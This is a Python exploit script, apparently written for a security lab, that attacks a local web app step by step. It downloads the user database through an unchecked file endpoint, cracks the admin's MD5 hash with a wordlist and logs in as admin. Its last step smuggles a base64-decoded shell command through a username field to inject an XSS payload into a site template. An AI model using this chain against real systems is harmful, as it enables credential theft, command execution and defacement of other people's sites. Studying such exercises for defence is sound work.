import requests
import sqlite3
import hashlib

# use this if running the client from inside its own docker container
HOST="host.docker.internal"
# otherwise just use localhost
#HOST="localhost"

SIGNUP_URL=f"http://{HOST}/signup"
LOGIN_URL=f"http://{HOST}/login"
DOWNLOAD_URL=f"http://{HOST}/download"
ADMIN_URL=f"http://{HOST}/admin"


def sign_up_a_user(username):
    password = '12345'
    response = requests.post(SIGNUP_URL, {'username': username, 'password': password}, allow_redirects=False)

    if response.status_code == 302:
        print('User: ' + username + ' created!')
    else:
        print(f"[WARNING] Could not create a user! Will try to log in with password {password}")
        print(f'[WARNING] REASON: {response.content.decode()}')

    return {'username': username, 'password': password}


def download_file(filename, cookies):
    response = requests.get(f"{DOWNLOAD_URL}?file={filename}", cookies=cookies)

    if response.status_code != 200:
        print(f"[ERROR] Could not download file {filename}")
        print(f'[ERROR] REASON: {response.content.decode()}')
        return None
        
    print(f"File {filename} downloaded!")

    file = open(filename, 'wb')
    file.write(response.content)
    file.close()

    return filename


def log_in_as(credentials):
    username = credentials['username']
    response = requests.post(LOGIN_URL, {'username': username, 'password': credentials['password']}, allow_redirects=False)
 
    if response.status_code == 302 and 'session' in response.cookies:
        print(f'Logged in as {username} successfully!')
    else:
        print(f"[ERROR] Could not log in as {username}!")
        return None
    
    return response.cookies


def retrieve_admin_hash_from_database(database):
    connection = sqlite3.connect(database);
    cursor = connection.cursor()
    cursor.execute('SELECT password FROM users WHERE username=\'admin\'')

    hash = cursor.fetchone()
    connection.close()
    return hash[0]


def crack_hash(hash, wordlist):
    with open(wordlist, 'r') as file:
        passwords = file.read().splitlines()

    for p in passwords:
        if hashlib.md5(p.encode()).hexdigest() == hash:
            print(f"Found password match! {p}")
            return p
    
    print(f"Hash {hash} did not match any password from the wordlist")
    return None


def delete_user(username, admin_session):
    res = requests.post(ADMIN_URL, {'username': username}, cookies=admin_session)
    print(f"Tried to delete a user {username}. Response status: {res.status_code}")



def main():
    # 1. Sign up an account named 'database'
    credentials = sign_up_a_user('database')    

    #2. Log in
    session = log_in_as(credentials)
    if not session:
        return

    # 3. Retrieve database.db file
    database = download_file('database.db', session)

    # 4. Retrieve admin's hash from the database
    hash = retrieve_admin_hash_from_database(database)

    # 5. Attempt to crack the hash
    password = crack_hash(hash, 'top10000.txt')
    if not password: 
        return
    
    # 6. Get admin session
    session = log_in_as({'username': 'admin', 'password': password})

    # 7. Inject command: append script to the templates/app.html
    delete_user('bob; echo PGltZyBzcmM9JyMnIG9uZXJyb3I9ImFsZXJ0KCdUaGlzIHNpdGUgaGF2ZSBiZWVuIGhhY2tlZCEnKSIgLz4= | base64 -d >> templates/app.html;', session)

    print('Client done! >>>>>>>>>')


if __name__ == "__main__":
    main()
